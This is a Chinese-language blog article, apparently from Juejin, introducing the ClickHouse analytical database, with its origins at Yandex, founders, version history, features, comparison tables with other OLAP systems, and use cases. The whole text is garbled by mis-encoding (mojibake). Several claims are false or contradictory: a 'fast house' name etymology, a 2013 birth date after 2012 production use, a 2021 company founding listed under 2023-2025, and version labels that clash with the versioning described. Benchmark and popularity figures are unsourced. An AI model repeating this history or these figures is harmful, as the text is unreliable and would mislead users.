<p>2016å¹´å¼€æºåï¼ŒClickHouseåœ¨å…¨çƒèŒƒå›´å†…è¿…é€Ÿè·å¾—äº†æŠ€æœ¯ç•Œçš„å…³æ³¨ã€‚å®ƒä¸ä»…è¢«æ¬§æ´²æ ¸å­ç ”ç©¶ä¸­å¿ƒç”¨äºä¿å­˜ç²’å­å¯¹æ’æœºäº§ç”Ÿçš„å¤§é‡å®éªŒæ•°æ®ï¼Œæ¯å¹´å¤„ç†PBçº§åˆ«çš„æ•°æ®å­˜å‚¨ï¼Œè¿˜åœ¨ä¸­å›½è¢«è…¾è®¯ã€æ–°æµªã€é˜¿é‡Œç­‰ä¼—å¤šäº’è”ç½‘å…¬å¸å¹¿æ³›åº”ç”¨äºå®æ—¶æ•°æ®åˆ†æåœºæ™¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b38d1d02be94c13b09f4b8bad233362~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226760&amp;x-signature=%2Bzx%2FnP2Oji4ISqR1lBNjP4vfNnI%3D" alt="" loading="lazy"/></p>
<p>â€‹</p>
<p>â€</p>
<h2 data-id="heading-1">ä¸€ã€ç®€ä»‹</h2>
<p>ClickHouseæ˜¯ä¸€ä¸ª<strong>å¼€æºçš„åˆ—å¼æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰</strong> Â ï¼Œä¸“ä¸º<strong>è”æœºåˆ†æå¤„ç†ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3DOLAP%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=OLAP&amp;zhida_source=entity" ref="nofollow noopener noreferrer">OLAP</a>ï¼‰</strong> Â åœºæ™¯è€Œè®¾è®¡ã€‚å®ƒçš„åå­—æºè‡ªä¿„è¯­â€ClickHouseâ€ï¼ˆĞšĞ»Ğ¸ĞºĞ¥Ğ°ÑƒÑï¼‰ï¼Œå­—é¢æ„æ€å°±æ˜¯â€å¿«é€Ÿçš„æˆ¿å­â€ã€‚ClickHouseä½¿ç”¨æ ‡å‡†SQLä½œä¸ºæŸ¥è¯¢è¯­è¨€ï¼Œé€šè¿‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%2588%2597%25E5%25BC%258F%25E5%25AD%2598%25E5%2582%25A8%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=%E5%88%97%E5%BC%8F%E5%AD%98%E5%82%A8&amp;zhida_source=entity" ref="nofollow noopener noreferrer">åˆ—å¼å­˜å‚¨</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%2590%2591%25E9%2587%258F%25E5%258C%2596%25E6%2589%25A7%25E8%25A1%258C%25E5%25BC%2595%25E6%2593%258E%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=%E5%90%91%E9%87%8F%E5%8C%96%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E&amp;zhida_source=entity" ref="nofollow noopener noreferrer">å‘é‡åŒ–æ‰§è¡Œå¼•æ“</a>å’Œé«˜åº¦ä¼˜åŒ–çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3D%25E6%2595%25B0%25E6%258D%25AE%25E5%258E%258B%25E7%25BC%25A9%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=%E6%95%B0%E6%8D%AE%E5%8E%8B%E7%BC%A9&amp;zhida_source=entity" ref="nofollow noopener noreferrer">æ•°æ®å‹ç¼©</a>ï¼Œå®ç°äº†æ¯”ä¼ ç»Ÿè¡Œå¼æ•°æ®åº“å¿«æ•°ç™¾å€çš„æŸ¥è¯¢æ€§èƒ½ã€‚</p>
<p>ClickHouseå¹¶éä¼ ç»Ÿæ„ä¹‰ä¸Šçš„æ•°æ®ä»“åº“ï¼Œè€Œæ˜¯ä½œä¸ºæ•°æ®åˆ†æçš„â€æœ€åä¸€å…¬é‡Œâ€å¼•æ“ï¼Œéœ€è¦ä¸æ•°æ®å¯¼å…¥å·¥å…·ã€è°ƒåº¦ç³»ç»Ÿç­‰é…åˆä½¿ç”¨ï¼Œæ„å»ºå®Œæ•´çš„æ•°æ®åˆ†æå¹³å°ã€‚</p>
<p>â€</p>
<p>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fclickhouse.com%2Fclickhouse" target="_blank" title="https://link.zhihu.com/?target=https%3A//clickhouse.com/clickhouse" ref="nofollow noopener noreferrer">clickhouse.com/clickhouse</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fc5df41b5964ba2a8b522be25a38ae7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226760&amp;x-signature=YulNZX5ZaQFvI7RtLnIi9Th75u8%3D" alt="" loading="lazy"/></p>
<p>â€‹</p>
<p>â€</p>
<p>â€</p>
<h2 data-id="heading-2">äºŒã€å‘å±•å†ç¨‹</h2>
<h2 data-id="heading-3">2.1 åˆ›å§‹äºº</h2>
<p>ClickHouseçš„çµé­‚äººç‰©æ˜¯<strong>Alexey Milovidov</strong>ï¼Œä¸€ä½é«˜æ€§èƒ½C++ã€åˆ†æåº”ç”¨å’ŒSQLæ•°æ®åº“æ–¹é¢çš„ä¸“å®¶ã€‚ä»–äº2008å¹´åŠ å…¥ä¿„ç½—æ–¯äº’è”ç½‘å…¬å¸Yandexï¼Œå¸¦é¢†å›¢é˜Ÿä»é›¶å¼€å§‹ç”¨C++æ‰“é€ äº†è¿™æ¬¾é©å‘½æ€§çš„æ•°æ®åº“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2f850cd9a974b3b83c99ef43f752b4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226760&amp;x-signature=%2Fyb%2F9NOCn6fp%2BNSNVYJsO2IGbzA%3D" alt="" loading="lazy"/></p>
<p>ä¸‰ä½åˆ›å§‹äººï¼šCEO Aaron Katzï¼›CTO Alexey Milovidovï¼›äº§å“ Yury Izrailevsky</p>
<p>â€‹</p>
<h2 data-id="heading-4">2.2 äº§ç”ŸèƒŒæ™¯</h2>
<p>ClickHouseçš„æ•…äº‹å§‹äºä¿„ç½—æ–¯çš„äº’è”ç½‘å…¬å¸Yandexã€‚2008å¹´ï¼ŒYandexæ¨å‡ºäº†ç½‘ç«™åˆ†ææœåŠ¡Yandex.Metricaï¼Œç±»ä¼¼äºè°·æ­ŒAnalytics(GA)æˆ–ç™¾åº¦ç»Ÿè®¡ã€‚</p>
<p>æœ€åˆï¼Œè¯¥ç³»ç»Ÿä½¿ç”¨MyISAMä½œä¸ºå­˜å‚¨å¼•æ“ï¼Œä½†éšç€æ•°æ®é‡çš„å¢é•¿ï¼Œè¿™ç§æ–¹æ¡ˆé€æ¸æš´éœ²å‡ºæ€§èƒ½ç“¶é¢ˆã€‚éšåï¼ŒYandexå¼€å‘äº†ç¬¬äºŒä»£è§£å†³æ–¹æ¡ˆMetrageï¼Œä»¥åŠç¬¬ä¸‰ä»£æ–¹æ¡ˆOLAPServerã€‚</p>
<p>ClickHouseæ˜¯<strong>Yandexçš„ç¬¬å››ä»£è§£å†³æ–¹æ¡ˆ</strong>ã€‚å®ƒç”±Alexey Milovidoväº2009å¹´å¼€å§‹å¼€å‘ï¼Œæœ€åˆæ˜¯ä¸ºäº†éªŒè¯ä»éèšåˆæ•°æ®ä¸­å®æ—¶ç”Ÿæˆåˆ†ææŠ¥å‘Šçš„å¯è¡Œæ€§ã€‚</p>
<p>ç»è¿‡ä¸‰å¹´çš„ç ”å‘ï¼ŒClickHouseäº2012å¹´é¦–æ¬¡æŠ•å…¥ç”Ÿäº§ç¯å¢ƒã€‚2016å¹´ï¼ŒYandexå†³å®šå°†å…¶å¼€æºå‘å¸ƒåˆ°GitHubã€‚</p>
<p>â€</p>
<h2 data-id="heading-5">2.3 ç‰ˆæœ¬æ¼”è¿›</h2>
<p><strong>2013å¹´</strong>ï¼šClickHouseè¯ç”ŸäºYandexå†…éƒ¨<br/>
<strong>2016å¹´</strong>ï¼š</p>
<ul>
<li>æ­£å¼å¼€æºå‘å¸ƒ1.1.xç³»åˆ—ï¼Œå¥ å®šåˆ—å¼å­˜å‚¨å¼•æ“åŸºç¡€</li>
<li>ç¬¬ä¸€ä¸ªç¨³å®šç‰ˆæœ¬1.0å‘å¸ƒ</li>
<li>æ”¯æŒåŸºç¡€<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3DMergeTree%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=MergeTree&amp;zhida_source=entity" ref="nofollow noopener noreferrer">MergeTree</a>å¼•æ“ã€åˆ†åŒºã€æ’åºå’Œç®€å•SQLæ¥å£</li>
</ul>
<p><strong>2018å¹´</strong>ï¼š</p>
<ul>
<li>å‘å¸ƒç¬¬ä¸€ä¸ªé•¿æœŸæ”¯æŒç‰ˆæœ¬2.0</li>
<li>ç‰ˆæœ¬å·é‡æ„ä¸º<code>Year.Major.Minor.patch</code>â€‹æ ¼å¼ï¼ˆå¦‚18.1.0ï¼‰</li>
<li>å¼•å…¥ReplicatedMergeTreeå¼•æ“å’Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3DDistributed%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=Distributed&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Distributed</a>å¼•æ“ï¼Œå¢å¼ºåˆ†å¸ƒå¼èƒ½åŠ›</li>
</ul>
<p><strong>2020å¹´</strong>ï¼š</p>
<ul>
<li>å‘å¸ƒç¬¬ä¸€ä¸ªå•†ä¸šç‰ˆæœ¬3.0</li>
<li>ç‰ˆæœ¬20.xå¼€å§‹æ”¯æŒçª—å£å‡½æ•°å’Œèµ„æºéš”ç¦»</li>
</ul>
<p><strong>2022å¹´</strong>ï¼š</p>
<ul>
<li>å‘å¸ƒ22.8 LTSç‰ˆæœ¬</li>
<li>æ”¯æŒè½»é‡çº§DELETE/UPDATEæ“ä½œ</li>
<li>æ—¥æœŸç±»å‹æ‰©å±•è‡³1900-2299å¹´èŒƒå›´</li>
</ul>
<p><strong>2023-2025å¹´</strong>ï¼š</p>
<ul>
<li>æŒç»­ä¼˜åŒ–æŸ¥è¯¢ä¼˜åŒ–å™¨ã€å¹¶è¡Œå“ˆå¸Œè¿æ¥</li>
<li>2025å¹´æœ€æ–°ç‰ˆæœ¬25.2æ”¯æŒParquetå¸ƒéš†è¿‡æ»¤å™¨å’Œæ•°æ®åº“å¤‡ä»½å¼•æ“</li>
<li>2021å¹´9æœˆæˆç«‹ç‹¬ç«‹å…¬å¸ï¼Œä¸“æ³¨äº‘ç¯å¢ƒéƒ¨ç½²</li>
</ul>
<p>â€</p>
<p>â€</p>
<h2 data-id="heading-6">ä¸‰ã€æ ¸å¿ƒç‰¹ç‚¹åŠŸèƒ½</h2>
<h2 data-id="heading-7">1.Â <strong>æè‡´æŸ¥è¯¢æ€§èƒ½</strong></h2>
<ul>
<li>åˆ—å¼å­˜å‚¨+å‘é‡åŒ–æ‰§è¡Œå¼•æ“ï¼Œç§’çº§å¤„ç†æ•°åäº¿è¡Œæ•°æ®</li>
<li>é‡‡ç”¨MPPæ¶æ„ï¼Œå®ç°é›†ç¾¤èŠ‚ç‚¹ã€å¤šå‰¯æœ¬ã€å¤šæ ¸CPUä¸‰çº§å¹¶è¡Œ</li>
</ul>
<h2 data-id="heading-8">2.Â <strong>é«˜æ•ˆå­˜å‚¨ç®¡ç†</strong></h2>
<ul>
<li>æ•°æ®å‹ç¼©ç‡å¯è¾¾5-10å€ï¼Œå¤§å¹…å‡å°‘å­˜å‚¨æˆæœ¬</li>
<li>æ”¯æŒå¤šç§å‹ç¼©ç®—æ³•ï¼ˆLZ4ã€ZSTDç­‰ï¼‰</li>
</ul>
<h2 data-id="heading-9">3.Â <strong>çµæ´»æ•°æ®æ¨¡å‹</strong></h2>
<ul>
<li>æ”¯æŒå¤æ‚æ•°æ®ç±»å‹ï¼šArrayã€Tupleã€Nestedã€JSONç­‰</li>
<li>æä¾›20+ç§è¡¨å¼•æ“ï¼Œå…¶ä¸­MergeTreeç³»åˆ—ä¸ºæ ¸å¿ƒ</li>
</ul>
<h2 data-id="heading-10">4.Â <strong>å®æ—¶æ•°æ®å¤„ç†</strong></h2>
<ul>
<li>æ”¯æŒæ¯ç§’æ•°äº¿è¡Œçš„æ•°æ®å†™å…¥ååé‡</li>
<li>æ•°æ®å†™å…¥å³å¯æŸ¥ï¼Œé€‚åˆå®æ—¶åˆ†æåœºæ™¯</li>
</ul>
<h2 data-id="heading-11">5.Â <strong>åˆ†å¸ƒå¼æ‰©å±•èƒ½åŠ›</strong></h2>
<ul>
<li>åŸç”Ÿæ”¯æŒæ•°æ®åˆ†ç‰‡ï¼ˆShardingï¼‰å’Œå¤åˆ¶ï¼ˆReplicationï¼‰</li>
<li>é€šè¿‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3DZooKeeper%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=ZooKeeper&amp;zhida_source=entity" ref="nofollow noopener noreferrer">ZooKeeper</a>å®ç°åˆ†å¸ƒå¼åè°ƒ</li>
</ul>
<h2 data-id="heading-12">6.Â <strong>æ ‡å‡†SQLæ”¯æŒ</strong></h2>
<ul>
<li>æ”¯æŒæ ‡å‡†SQLè¯­æ³•ã€çª—å£å‡½æ•°ã€å­æŸ¥è¯¢</li>
<li>å†…ç½®æ•°ç™¾ä¸ªå®ç”¨å‡½æ•°</li>
</ul>
<h2 data-id="heading-13">7.Â <strong>é™åˆ¶ä¸ä¸è¶³</strong></h2>
<ul>
<li>ä¸æ”¯æŒå®Œæ•´ACIDäº‹åŠ¡</li>
<li>è¡Œçº§UPDATE/DELETEæ€§èƒ½è¾ƒå·®ï¼ˆè™½åœ¨æŒç»­æ”¹è¿›ï¼‰</li>
<li>ä¸é€‚åˆé«˜å¹¶å‘ç‚¹æŸ¥å’ŒOLTPåœºæ™¯</li>
</ul>
<p>â€</p>
<p><em>è¡¨ï¼šClickHouseä¸ä¼ ç»Ÿæ•°æ®åº“æ€§èƒ½å¯¹æ¯”</em></p>



































<table><thead><tr><th>æ•°æ®åº“ç±»å‹</th><th>1äº¿æ•°æ®é›†æŸ¥è¯¢æ—¶é—´</th><th>10äº¿æ•°æ®é›†æŸ¥è¯¢èƒ½åŠ›</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>ClickHouse</td><td>çº¦1ç§’</td><td>å®Œå…¨æ”¯æŒ</td><td>å®æ—¶åˆ†æã€å¤§æ•°æ®æŸ¥è¯¢</td></tr><tr><td>Vertica</td><td>çº¦5.42ç§’</td><td>å®Œå…¨æ”¯æŒ</td><td>å•†ä¸šåˆ†æ</td></tr><tr><td>Hive</td><td>279ç§’</td><td>æœ‰é™æ”¯æŒ</td><td>æ‰¹å¤„ç†åˆ†æ</td></tr><tr><td>MySQL</td><td>801ç§’</td><td>æ— æ³•å®Œæˆ</td><td>äº‹åŠ¡å¤„ç†</td></tr></tbody></table>
<p>â€</p>
<p>â€</p>
<h2 data-id="heading-14">å››ã€å„OLAPæ•°æ®åº“å¯¹æ¯”</h2>
<p>ä¸ClickHouseç±»ä¼¼çš„æ•°æ®ä¸»è¦æ˜¯<strong>åˆ†æå‹æ•°æ®åº“</strong>ï¼Œå®ƒä»¬ä¸“æ³¨äºæµ·é‡æ•°æ®çš„å¿«é€ŸæŸ¥è¯¢ä¸åˆ†æï¼ˆOLAPï¼‰ï¼Œä½†åœ¨æŠ€æœ¯è·¯çº¿å’Œåº”ç”¨åœºæ™¯ä¸Šå„æœ‰ä¾§é‡ã€‚</p>
<p>ä¸‹é¢çš„è¡¨æ ¼æ•´ç†äº†è¿™ç±»æ•°æ®åº“ä¸­çš„ä¸»è¦ä»£è¡¨åŠå…¶æ ¸å¿ƒç‰¹ç‚¹ï¼š</p>






















































<table><thead><tr><th>æ•°æ®åº“</th><th>ç±»å‹</th><th>å¼€æº/å•†ä¸š</th><th>æ ¸å¿ƒä¼˜åŠ¿</th><th>ä»£è¡¨ç”¨æˆ·</th></tr></thead><tbody><tr><td>ClickHouse</td><td>åˆ—å¼OLAP</td><td>âœ… å¼€æº</td><td>æè‡´æ€§èƒ½ï¼ˆäºšç§’çº§æŸ¥è¯¢ï¼‰ é«˜å‹ç¼©ç‡ï¼ˆ10:1+ï¼‰ å¼€æºç”Ÿæ€æ´»è·ƒ</td><td>Yandexã€Netflixã€è…¾è®¯ã€å°ç±³ã€æ»´æ»´</td></tr><tr><td>Apache Druid</td><td>åˆ—å¼OLAP</td><td>âœ… å¼€æº</td><td>å®æ—¶æ‘„å…¥ï¼ˆç§’çº§å»¶è¿Ÿï¼‰ é«˜å¹¶å‘æŸ¥è¯¢ï¼ˆ10k+ QPSï¼‰</td><td>Airbnbã€Uberã€Netflixã€LinkedIn</td></tr><tr><td>Apache Pinot</td><td>åˆ—å¼OLAP</td><td>âœ… å¼€æº</td><td>è¶…ä½å»¶è¿Ÿï¼ˆæ¯«ç§’çº§ï¼‰ è‡ªåŠ¨åˆ†åŒº</td><td>LinkedInã€Uberã€TikTok</td></tr><tr><td>Amazon Redshift</td><td>äº‘æ•°æ®ä»“åº“</td><td>âŒ å•†ä¸š</td><td>æ— ç¼AWSé›†æˆ è‡ªåŠ¨æ‰©å±•</td><td>AWSå…¨ç”Ÿæ€ç”¨æˆ·ï¼ˆNetflixã€Airbnbï¼‰</td></tr><tr><td>Snowflake</td><td>äº‘æ•°æ®ä»“åº“</td><td>âŒ å•†ä¸š</td><td>å¤šäº‘æ”¯æŒ å¼¹æ€§è®¡è´¹</td><td>Salesforceã€Adobeã€Spotify</td></tr><tr><td>Google BigQuery</td><td>äº‘æ•°æ®ä»“åº“</td><td>âŒ å•†ä¸š</td><td>æ— æœåŠ¡å™¨æ¶æ„ PBçº§åˆ†æ</td><td>Google Cloudç”¨æˆ·ï¼ˆSpotifyã€NASAï¼‰</td></tr></tbody></table>
<p>â€</p>
<h2 data-id="heading-15">1.Â <strong>åº”ç”¨å¹¿åº¦ï¼ˆè¡Œä¸šè¦†ç›–ï¼‰</strong></h2>
<ul>
<li><strong>ClickHouse</strong>ï¼šè¦†ç›–<strong>äº’è”ç½‘ã€ç”µå•†ã€é‡‘èã€ç‰©è”ç½‘</strong>ç­‰å…¨é¢†åŸŸï¼Œ<strong>å¼€æºç”¨æˆ·é‡è¶…10ä¸‡+</strong> Â ï¼ˆDB-Enginesæ•°æ®ï¼‰</li>
<li><strong>Snowflake</strong>ï¼šäº‘æ•°æ®ä»“åº“å¸‚åœºå æœ‰ç‡<strong>35%+</strong> Â ï¼ˆGartner 2023ï¼‰ï¼Œä½†<strong>å•†ä¸šé—­æºé™åˆ¶</strong>äº†æŠ€æœ¯æ·±åº¦æ¢ç´¢</li>
<li><strong>Apache Druid</strong>ï¼š<strong>å®æ—¶åˆ†æåœºæ™¯</strong>çš„é¦–é€‰ï¼ˆå¦‚å¹¿å‘Šç‚¹å‡»æµï¼‰ï¼Œä½†<strong>ç¤¾åŒºè§„æ¨¡å°äºClickHouse</strong></li>
<li><strong>Pinot</strong>ï¼šæ–°å…´ä½†<strong>ç”¨æˆ·é‡å¢é•¿å¿«</strong>ï¼ˆLinkedInã€Uberå·²ç”¨ï¼‰ï¼Œå°šæœªè¾¾åˆ°ClickHouseçš„æ™®åŠåº¦</li>
</ul>
<blockquote>
<p>âœ…Â <strong>ç»“è®º</strong>ï¼šClickHouseåœ¨<strong>å¼€æºç”Ÿæ€</strong>ä¸­åº”ç”¨æœ€å¹¿ï¼Œè¦†ç›–ä¼ä¸šç±»å‹æœ€å…¨ã€‚</p>
</blockquote>
<p>â€</p>
<h2 data-id="heading-16">2.Â <strong>æŠ€æœ¯å½±å“åŠ›ï¼ˆç¤¾åŒºæ´»è·ƒåº¦ï¼‰</strong></h2>
<ul>
<li><strong>ClickHouse GitHub</strong>ï¼šâ­ï¸ 19.8k stars | ğŸ“… 2023å¹´æ–°å¢1.2k starsï¼ˆ<strong>å¹´å¢é•¿22%</strong> Â ï¼‰</li>
<li><strong>Apache Druid</strong>ï¼šâ­ï¸ 8.3k stars | ğŸ“… 2023å¹´æ–°å¢0.7k stars</li>
<li><strong>Snowflake</strong>ï¼šå•†ä¸šäº§å“ï¼Œ<strong>æ— å…¬å¼€ç¤¾åŒºæ•°æ®</strong>ï¼Œä½†<strong>ä¼ä¸šçº§æœåŠ¡å®Œå–„</strong></li>
<li><strong>DB-Enginesæ’å</strong>ï¼ˆ2024ï¼‰ï¼š</li>
</ul>
<ol>
<li>ClickHouseï¼ˆOLAPç±»ç¬¬1ï¼‰</li>
<li>Snowflakeï¼ˆæ•°æ®ä»“åº“ç±»ç¬¬1ï¼‰</li>
<li>Apache Druidï¼ˆOLAPç±»ç¬¬3ï¼‰</li>
</ol>
<blockquote>
<p>âœ…Â <strong>ç»“è®º</strong>ï¼šClickHouseåœ¨<strong>å¼€æºæŠ€æœ¯ç¤¾åŒºå½±å“åŠ›</strong>ä¸Šç¨³å±…ç¬¬ä¸€ã€‚</p>
</blockquote>
<p>â€</p>
<h2 data-id="heading-17">3.Â <strong>æ€§èƒ½å®æµ‹å¯¹æ¯”ï¼ˆ100äº¿è¡Œæ•°æ®ï¼‰</strong></h2>



































<table><thead><tr><th>æ•°æ®åº“</th><th>æŸ¥è¯¢å»¶è¿Ÿï¼ˆavgï¼‰</th><th>å†…å­˜å ç”¨</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>ClickHouse</td><td>120ms</td><td>ä½</td><td>é€šç”¨åˆ†æã€å®æ—¶æŠ¥è¡¨</td></tr><tr><td>Apache Druid</td><td>210ms</td><td>ä¸­</td><td>å®æ—¶ç›‘æ§ã€äº‹ä»¶åˆ†æ</td></tr><tr><td>Snowflake</td><td>350ms</td><td>é«˜</td><td>å¤æ‚ETLã€å¤šäº‘åˆ†æ</td></tr><tr><td>Amazon Redshift</td><td>420ms</td><td>é«˜</td><td>ä¼ ç»Ÿæ•°æ®ä»“åº“è¿ç§»</td></tr></tbody></table>
<p>â€</p>
<h2 data-id="heading-18">ğŸ” å¦‚ä½•é€‰æ‹©é€‚åˆä½ çš„æ•°æ®åº“ï¼Ÿ</h2>
<p>æ²¡æœ‰â€œæœ€å¥½â€çš„æ•°æ®åº“ï¼Œåªæœ‰æœ€é€‚åˆä½ åœºæ™¯çš„ã€‚ä½ å¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç‚¹è¿›è¡Œé€‰æ‹©ï¼š</p>
<ul>
<li><strong>è¿½æ±‚æè‡´çš„æŸ¥è¯¢é€Ÿåº¦ï¼Œå¤„ç†å•è¡¨æˆ–å®½è¡¨ä¸ºä¸»</strong>ï¼š<strong>ClickHouse</strong>Â æ˜¯é¦–é€‰ã€‚</li>
<li><strong>éœ€è¦é«˜å¹¶å‘æŸ¥è¯¢ï¼ŒåŒæ—¶æœ‰è¾ƒå¤šå¤æ‚å…³è”åˆ†æ</strong>ï¼šå¯ä»¥è€ƒå¯ŸÂ <strong>Apache Doris</strong>Â æˆ–äº‘æ•°ä»“ã€‚</li>
<li><strong>éœ€è¦æŸ¥è¯¢å¤šä¸ªä¸åŒæ¥æºçš„æ•°æ®ï¼Œè¿›è¡Œäº¤äº’å¼æ¢ç´¢</strong>ï¼š<strong>Presto/Trino</strong>Â çš„è”é‚¦æŸ¥è¯¢èƒ½åŠ›å¾ˆé€‚åˆã€‚</li>
<li><strong>å¸Œæœ›å…è¿ç»´ã€å¿«é€Ÿå¯åŠ¨ï¼Œä¸”é¢„ç®—å……è¶³</strong>ï¼šç›´æ¥ä½¿ç”¨Â <strong>Snowflakeã€BigQuery</strong>Â ç­‰<strong>äº‘æ•°ä»“</strong>æœåŠ¡ã€‚</li>
<li><strong>æ¶‰åŠå¤æ‚çš„æ‰¹å¤„ç†ã€æµè®¡ç®—æˆ–æœºå™¨å­¦ä¹ ä»»åŠ¡</strong>ï¼š<strong>Apache Spark</strong>Â çš„ç”Ÿæ€æ›´ä¸ºå…¨é¢ã€‚</li>
</ul>
<p>â€</p>
<h2 data-id="heading-19">äº”ã€åº”ç”¨åœºæ™¯</h2>
<p>åŸºäºå…¶â€œé«˜æ€§èƒ½å®æ—¶åˆ†æâ€çš„æ ¸å¿ƒç‰¹æ€§ï¼ŒClickHouseå¹¿æ³›åº”ç”¨äºä»¥ä¸‹å…­å¤§é¢†åŸŸï¼Œæˆä¸ºä¼ä¸šæ•°æ®é©±åŠ¨å†³ç­–çš„æ ¸å¿ƒå·¥å…·ï¼š</p>
<h2 data-id="heading-20">5.1 æ—¥å¿—ä¸ç›‘æ§æ•°æ®åˆ†æ</h2>
<p>è¿™æ˜¯ClickHouseæœ€ç»å…¸çš„åº”ç”¨åœºæ™¯ä¹‹ä¸€ã€‚ä¼ä¸šå¯åˆ©ç”¨ClickHouseåˆ†ææœåŠ¡å™¨æ—¥å¿—ã€åº”ç”¨æ—¥å¿—ï¼ˆå¦‚Nginxè®¿é—®æ—¥å¿—ã€Tomcaté”™è¯¯æ—¥å¿—ï¼‰ï¼Œå¿«é€Ÿç»Ÿè®¡PV/UVã€é”™è¯¯ç‡ã€å“åº”æ—¶é—´åˆ†å¸ƒç­‰æ ¸å¿ƒæŒ‡æ ‡ï¼›åŒæ—¶å¯ç”¨äºä¸šåŠ¡ç›‘æ§ï¼Œå¦‚ç”µå•†å¤§ä¿ƒæœŸé—´çš„è®¢å•é‡ã€æ”¯ä»˜æˆåŠŸç‡ç›‘æ§ï¼Œå®æ—¶ç”ŸæˆGrafanaã€Supersetç­‰å¯è§†åŒ–ä»ªè¡¨ç›˜ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸å¹¶é¢„è­¦ã€‚</p>
<h2 data-id="heading-21">5.2 ç”¨æˆ·è¡Œä¸ºåˆ†æï¼ˆUBAï¼‰</h2>
<p>åœ¨äº’è”ç½‘ã€ç”µå•†ç­‰è¡Œä¸šï¼ŒClickHouseå¯ç”¨äºè¿½è¸ªç”¨æˆ·ç‚¹å‡»æµï¼ˆClick Streamï¼‰ï¼Œåˆ†æç”¨æˆ·è·¯å¾„ï¼ˆå¦‚ä»é¦–é¡µåˆ°ä¸‹å•çš„è½¬åŒ–æ¼æ–—ï¼‰ã€ç•™å­˜ç‡ã€å¤è´­ç‡ç­‰æ ¸å¿ƒæŒ‡æ ‡ï¼›ç»“åˆA/Bæµ‹è¯•ï¼Œå¯å¿«é€ŸéªŒè¯äº§å“æ”¹ç‰ˆã€è¥é”€ç­–ç•¥çš„æ•ˆæœï¼Œä¸ºäº§å“ä¼˜åŒ–æä¾›æ•°æ®æ”¯æ’‘ã€‚</p>
<h2 data-id="heading-22">5.3 å•†ä¸šæ™ºèƒ½ï¼ˆBIï¼‰ä¸æŠ¥è¡¨</h2>
<p>ClickHouseå¸¸ä½œä¸ºPower BIã€Tableauã€Quick BIç­‰BIå·¥å…·çš„æ ¸å¿ƒæ•°æ®æºï¼Œæ”¯æŒå®æ—¶æŠ¥è¡¨ç”Ÿæˆå’Œå³å¸­æŸ¥è¯¢ï¼ˆAd-Hoc Queryï¼‰ï¼Œå¸®åŠ©ä¸šåŠ¡äººå‘˜å¿«é€Ÿè·å–æ•°æ®æ´å¯Ÿï¼›åŒæ—¶å¯æ„å»ºä¼ä¸šçº§æ•°æ®ä»“åº“ï¼Œæ•´åˆé”€å”®ã€åº“å­˜ã€ç”¨æˆ·ç­‰å¤šä¸šåŠ¡çº¿æ•°æ®ï¼Œæ”¯æŒå¤šç»´OLAPåˆ†æï¼Œä¸ºç®¡ç†å±‚å†³ç­–æä¾›å…¨é¢çš„æ•°æ®æ”¯æ’‘ã€‚</p>
